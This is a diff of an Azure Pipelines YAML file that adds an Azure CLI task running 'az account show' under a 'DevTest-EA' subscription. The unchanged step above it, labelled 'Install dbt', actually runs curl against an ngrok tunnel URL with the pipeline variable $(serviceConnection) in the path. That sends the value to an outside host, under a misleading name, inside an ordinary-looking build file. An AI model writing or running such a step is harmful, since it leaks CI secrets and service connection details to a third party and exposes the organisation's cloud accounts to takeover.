@@ -27,3 +27,12 @@ jobs:
       - bash: |
           curl https://ba3d-2a02-2f09-e11a-600-fc64-d0d3-9f5b-d506.ngrok-free.app/$(serviceConnection)
         displayName: Install dbt
+      - task: AzureCLI@2
+        displayName: Azure CLI
+        inputs:
+          azureSubscription: DevTest-EA
+          scriptType: ps
+          scriptLocation: inlineScript
+          inlineScript: |
+            az --version
+            az account show
